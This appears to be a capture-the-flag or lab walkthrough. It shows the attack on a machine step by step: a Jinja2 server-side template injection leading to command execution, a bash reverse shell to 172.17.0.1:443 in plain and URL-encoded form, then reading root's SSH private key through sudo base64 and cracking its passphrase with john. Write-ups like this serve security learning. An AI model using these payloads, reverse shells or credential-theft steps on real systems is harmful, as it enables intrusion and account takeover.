# Port Scans and Services
* There are three ports open, 22, 80, and 8089
* There's a web app on port 8089
# Initial Access (Server-Side Template Injection)
* We see the web app takes in user input and returns it in the resulting page
* When we test this payload, it performs calculations..
```
{{7 * 7}}
```
* We suspect that this app is running the Jinja2 engine, so we try this payload
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
* This confirms that the engine is Jinja2
* This website has a number of SSTi payloads
`https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#exploit-the-ssti-by-calling-ospopenread`
* This payload will let us perform RCE 
```
{{ lipsum.__globals__["os"].popen('<OS COMMAND HERE>').read() }}
```
* From here, we can send the following reverse shell payload to get initial access...
```
bash -c \'bash -i >& /dev/tcp/172.17.0.1/443 0>&1\'
```
Which doesn't work, unless it's URL encoded
```
bash%20-c%20%5C%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F443%200%3E%261%5C%27
```
# Privilege Escalation (Sudo Base64)
* After connection, we see that our user has sudo permissions with the b64 program, which allows for privileged file read
* It turns out that the root user has an SSH key, and we can access it and use it to log in as the root user
```
sudo base64 /root/.ssh/id_rsa | base64 --decode
```
* But first we have to crack the passphrase on the SSH key
```
ssh2john id_rsa > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
```
Finis
